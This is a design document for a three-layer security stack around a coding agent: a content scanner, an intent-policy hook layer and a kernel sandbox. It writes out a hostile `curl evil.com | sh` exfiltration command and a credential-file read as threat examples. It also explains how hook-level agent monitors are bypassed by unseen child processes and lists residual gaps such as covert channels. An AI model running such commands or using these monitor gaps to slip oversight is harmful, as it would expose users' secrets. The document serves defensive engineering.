# Spektralia — Multi-Layer AI Security Endpoint Stack

Spektralia is one layer of an endpoint's defense, not the whole of it. The endpoint
here is a developer workstation running a coding agent (Claude Code). This document
shows how Spektralia composes with a process sandbox ([Fence](https://github.com/fencesandbox/fence))
and a Falco-based policy layer ([Prempti](https://github.com/falcosecurity/prempti))
into a defense-in-depth stack, and — just as importantly — where the seams are.

The execution plane shown here uses Fence; [navikt/cplt](https://github.com/navikt/cplt) is an
alternative sandbox for that plane (notably the only option that runs on macOS, plus a
domain-filtering egress proxy and built-in git/gh guards). See
[docs/SANDBOX_ALTERNATIVES.md](SANDBOX_ALTERNATIVES.md) for the Fence-vs-cplt comparison.

See also: [docs/SANDBOX_ALTERNATIVES.md](SANDBOX_ALTERNATIVES.md) | [docs/THREATS.md](THREATS.md) | [docs/COMPLIANCE.md](COMPLIANCE.md) | [SPEC.md](SPEC.md)

---

## Three planes of one endpoint

The three tools are **complementary, not redundant**. Each answers a different question,
and each covers a gap the others structurally cannot reach.

| Tool | Plane | Question it answers | Mechanism |
|------|-------|---------------------|-----------|
| **Spektralia** | Data | *What information leaves the endpoint for the cloud LLM?* | Content scan — regex + Luhn/MOD-11 validators + entropy + decoded payloads + a local classifier — on prompts and tool I/O, via Claude Code hooks |
| **Prempti** | Control / intent | *What is the agent asking to do?* | Falco rule engine over hook events (`PreToolUse`) → `deny` / `ask` / `allow` the action |
| **Fence** (or **cplt** — see [SANDBOX_ALTERNATIVES.md](SANDBOX_ALTERNATIVES.md)) | Execution / side-effects | *What actually runs against the OS?* | `bubblewrap` namespaces + `landlock` + `seccomp`; default-deny network |

A cross-cutting **visibility** plane unifies the three telemetry streams (see below).

```
                         ┌─────────────────────────────────────────────┐
                         │            developer endpoint                │
   typed prompt ─────────┼──► [Spektralia · UserPromptSubmit] ──► cloud │   DATA plane
                         │                                              │
   agent tool call ──────┼──► [Prempti · PreToolUse]   intent policy    │   CONTROL plane
                         │     [Spektralia · PreToolUse] content scan   │   DATA plane
                         │            │                                 │
                         │            ▼                                 │
                         │     ┌──────────────────┐                     │
                         │     │  Fence sandbox   │  no-net + landlock  │   EXECUTION plane
                         │     │  (agent runs     │  + seccomp          │
                         │     │   inside here)   │                     │
                         │     └──────────────────┘                     │
                         │            │ tool output                     │
                         │            ▼                                 │
   tool output ──────────┼──► [Spektralia · PostToolUse] ──► context    │   DATA plane
                         └─────────────────────────────────────────────┘
        all three planes ──► hash-chained audit / Falco logs / sandbox violations ─► SIEM   VISIBILITY
```

---

## The load-bearing argument: why three layers

Prempti and Spektralia both intercept at the **Claude Code hook API**. They see what the
agent *intends* — the command it asks to run, the arguments it passes — not what the
resulting process tree actually *does*. Prempti's own documentation states the limit
plainly: it "sees the commands the agent asks to run, not the side effects those commands
produce."

A hook-level control is bypassed the moment execution escapes the hook API. The canonical
case is a shell child process: the hook sees `bash -c "curl evil.com | sh"` and, finding
no sensitive content (Spektralia) and no matching policy rule (Prempti), lets it through.
The child `sh` that exfiltrates data is invisible to both hook-level layers — it was never
an event on the hook API.

**Fence is the kernel-enforced backstop** that constrains side effects regardless of
whether the hook layer ever saw the intent. The `curl … | sh` child hits a network
namespace with no route out and fails. This gap — intent visibility versus side-effect
containment — is the entire reason the stack has three layers rather than one.

---

## Request lifecycle — how one tool call traverses the stack

A single tool call flows through the planes in order, each with its rationale:

```
agent intends a tool call
  → [Prempti  · PreToolUse]    intent policy (Falco rules): deny / ask / allow the ACTION   (cheap, deterministic — runs first)
  → [Spektralia · PreToolUse]  content scan of the ARGS: block PII / credentials in payload  (may invoke local classifier — runs second)
  → command dispatched
  → [Fence]                    sandbox executes: default-deny net + landlock + seccomp        (kernel backstop on side-effects)
  → tool output
  → [Spektralia · PostToolUse] content scan of OUTPUT before it re-enters context / the cloud (fast, rule-only)
```

Typed prompts take a shorter path: `UserPromptSubmit → Spektralia` only. **Prempti does
not see typed prompts** — it intercepts tool calls, not user input — and Fence does not
read content. A live API key pasted into a prompt is therefore caught *only* by
Spektralia's `UserPromptSubmit` hook. This asymmetry matters when reasoning about coverage.

---

## Hook ordering — the real composition issue

Both Spektralia (`integrations/claude_code_hooks/pre_tool_use.py`) and Prempti register a
`PreToolUse` hook. Claude Code runs every registered hook for a matcher, and any `deny`
blocks the call. The order is a deliberate choice:

- **Prempti first.** Its Falco rules are coarse, deterministic, and LLM-free. Fail-fast on
  obviously-forbidden actions (`git push`, writing `.env`, a reverse shell) before spending
  any content-scanning effort on an action that is going to be denied anyway.
- **Spektralia second.** Its content scan may reach the local classifier and cost real
  latency. Run it only once the action itself is permitted.
- **Combined verdict = deny if *either* denies** (OR-to-block / AND-to-pass). This mirrors
  Spektralia's own internal rule, `rule_hit OR classifier_high → block`: no single layer
  can unilaterally pass, but either can block.
- **Avoid double-prompting.** Keep Spektralia in **strict mode** (deny, no prompt) at
  `PreToolUse`, and let Prempti's `ask` verdict own all user interaction. The two never
  compete for the prompt. (Spektralia's soft mode exists for its own reason — user
  prompting on classifier-only hits — and should not be enabled here merely because
  Prempti is present.)

---

## How Fence wraps the agent

> This section describes Fence specifically. [navikt/cplt](https://github.com/navikt/cplt) is an
> alternative execution-plane sandbox — purpose-built to wrap coding agents, cross-platform
> (Linux + macOS), with a domain-filtering egress proxy and built-in git/gh guards. See
> [docs/SANDBOX_ALTERNATIVES.md](SANDBOX_ALTERNATIVES.md) for the comparison and its allowlist.

Fence can wrap execution at three granularities:

1. **`fence bash -c …` per command** — finest-grained, but only covers tools that shell
   out via Bash; a tool that performs I/O directly is untouched.
2. **The agent process itself launched inside Fence** — the whole process tree, including
   every subprocess shell the hook layer never sees, inherits the sandbox.
3. **A Fence-wrapped login shell** — coarse, and tied to interactive shells.

**Recommended: option 2 — launch Claude Code inside Fence.** It is the only model that
makes the backstop argument honest: the `curl … | sh` child from the load-bearing example
is contained precisely because it is a descendant of the sandboxed agent process. The
trade-off is that the sandbox must be provisioned to permit everything the stack legitimately
needs.

**Fence allowlist the stack requires.** With the agent inside Fence, the following must be
explicitly permitted or the stack cannot function:

- **Ollama endpoint** — the UDS socket path *or* `127.0.0.1:11434` TCP. This is Spektralia's
  classifier; deny it and the gate fails closed on every call.
- **`~/.spektralia/` writable** — the hash-chained audit log, `audit.state`, and the `FREEZE`
  file all live here.
- **Prempti's Unix socket** — the hook IPC must cross the sandbox boundary.
- **`~/.prempti/`** — if its rules or logs are read or written from inside the sandbox.
- **Project working directory writable**; everything else denied (Fence's default).

**Where the host services sit.** Ollama and the Prempti service run **outside** Fence as
host services; the sandboxed agent reaches them only over the allowlisted IPC above. This
does not weaken Spektralia's Ollama trust model — the PID + binary-SHA-256 pin
(`src/spektralia/ollama_trust.py`) is recorded against the real, outside-the-sandbox Ollama
process, and the UDS owner/mode checks are unaffected by the sandbox boundary.

---

## Why not one layer — worked examples

For each threat, which layer catches it and why the others structurally cannot:

| Threat | Caught by | Why the others miss it |
|--------|-----------|------------------------|
| Prompt typed with a live API key | **Spektralia** @ `UserPromptSubmit` | Prempti never sees typed prompts; Fence does not read content |
| `cat ~/.aws/credentials` surfacing secrets into context | **Spektralia** @ `PostToolUse` (content) + **Prempti** sensitive-path rule (intent) | Fence would allow the read inside an allowlisted dir |
| `git push` to an attacker-controlled remote | **Prempti** (Falco rule) | No PII in the args → Spektralia passes; Fence may allow if the host is allowlisted |
| `curl evil.com \| sh` — exfiltrating child process | **Fence** (network namespace deny) | The hook API saw only `bash -c "curl…"`; the child `sh` is **invisible to both hook-level layers** |
| Reverse shell / persistence vector | **Prempti** rule (intent) + **Fence** (net + exec containment) | Spektralia sees no sensitive content to flag |

The `curl … | sh` row is the cleanest justification for the third layer: it is the one
threat no hook-level control can see.

---

## Visibility plane — one timeline from three streams

Each plane emits its own telemetry; correlating them on the same tool-call event gives a
single auditable timeline:

- **Spektralia** — a hash-chained, tamper-evident `AuditRecord` (JSON) per action, written
  through the pluggable `AuditSink` abstraction (`src/spektralia/audit.py`). A subclass that
  forwards records to a SIEM is the documented integration point; the chain's `prev_hash`
  linking makes deletions detectable even after forwarding.
- **Prempti** — structured per-tool-call verdict logs (`premptictl logs`), one record per
  `deny` / `ask` / `allow` decision.
- **Fence** — monitoring mode (`-m`) surfaces actual sandbox violations: the network and
  filesystem accesses that were denied at the kernel boundary.

Recommend stamping a **shared correlation id** onto the tool-call event so the three
records join. The net result is one timeline carrying **intent decisions (Prempti) +
content decisions (Spektralia) + execution violations (Fence)** — the same event seen at
three depths.

---

## Posture — fail-closed across all three

Spektralia's posture is fail-closed throughout (see [THREATS.md § Posture](THREATS.md));
the stack only holds if its neighbors share it:

- **Spektralia** — classifier unavailable → block (unless `SPEKTRALIA_FAIL_OPEN=1`); canary
  drift → auto-freeze → all subsequent calls block.
- **Prempti** — guardrails mode enforces verdicts by default; if the Prempti service is
  down, the hook should fail-closed (deny), not fail-open.
- **Fence** — default-deny network; if the sandbox cannot be established, the command must
  not run.
- **Combined** — block if *any* layer is uncertain. Uncertainty in one plane is never
  silently covered by another.

---

## Out-of-scope — what the stack still does NOT cover

Adding layers narrows the gap; it does not close it. Honest residual exposure:

- **Kernel / root / `CAP_SYS_PTRACE` attacker.** Defeats all three. Fence is user-space
  namespace isolation; root escapes it, and a sufficiently privileged process can read any
  memory regardless of `PR_SET_DUMPABLE`. Out of scope here as it is in
  [THREATS.md § Out-of-scope](THREATS.md).
- **Cloud-side leak channels above the boundary.** Conversation-history accumulation of
  sanitized tokens across turns, and `/compact` summarisation, both happen above the API
  surface that any of these tools can see. This is Spektralia's existing documented gap and
  adding Prempti or Fence does not change it.
- **Covert channels within allowlisted destinations.** Exfiltration over a domain Fence
  permits, or data smuggled inside an action Prempti allows, is not caught by network or
  intent policy.
- **Cross-layer integrity.** All three layers typically run under the same UID, so one can
  in principle disable another. Spektralia already self-checks (`spektralia hook-check`,
  `verify-integrity`). The sandbox half of this is now implemented: **`spektralia check-sandbox`**
  (wired into the `SessionStart` preflight) asserts the configured execution-plane wrapper
  (`fence` or `cplt`) is on `PATH` and optionally pins its config hash the way Spektralia pins its
  pattern, prompt, and model digests — see [docs/SANDBOX_ALTERNATIVES.md](SANDBOX_ALTERNATIVES.md).
  The control-plane half is now implemented too: **`spektralia check-prempti`** (also wired into the
  `SessionStart` preflight) asserts the Prempti service is up — `premptictl` on `PATH`, a live IPC
  socket if `prempti_socket` is set, and an optional detect-only config-hash pin — `none` by default
  so existing installs are unaffected. A ready-to-deploy bundle wiring all three planes together
  lives in [`endpoint/`](../endpoint/README.md).

---

## Where this maps in existing docs

The layering aligns with the OWASP Agentic Security Initiative (ASI) Top 10 coverage
tracked in [docs/COMPLIANCE.md](COMPLIANCE.md): the data plane addresses sensitive-information
disclosure, the control plane addresses excessive agency and unsafe tool use, and the
execution plane addresses the side-effect and resource-exhaustion classes that a content
gate alone cannot reach.
